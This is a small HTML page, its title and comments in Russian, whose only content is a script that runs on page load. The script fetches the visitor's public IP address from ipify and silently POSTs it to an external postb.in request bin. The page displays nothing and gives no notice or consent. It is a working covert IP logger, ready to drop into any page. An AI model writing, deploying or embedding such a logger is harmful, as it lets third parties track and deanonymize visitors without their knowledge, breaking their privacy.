<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Отправка IP на PostBin</title>
</head>
<body>
    <script>
        function submitIP() {
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    fetch('https://www.postb.in/b/1742464902008-3353886159602', {
                        method: 'POST',
                        body: JSON.stringify({ ip_address: ipAddress })
                    })
                    .then(response => {
                        console.log('IP успешно отправлен на сервер.');
                    })
                    .catch(error => {
                        console.error('Произошла ошибка при отправке IP:', error);
                    });
                })
                .catch(error => {
                    console.error('Ошибка при получении IP-адреса:', error);
                });
        }

        submitIP(); // Вызов функции отправки IP при загрузке страницы
    </script>
</body>
</html>
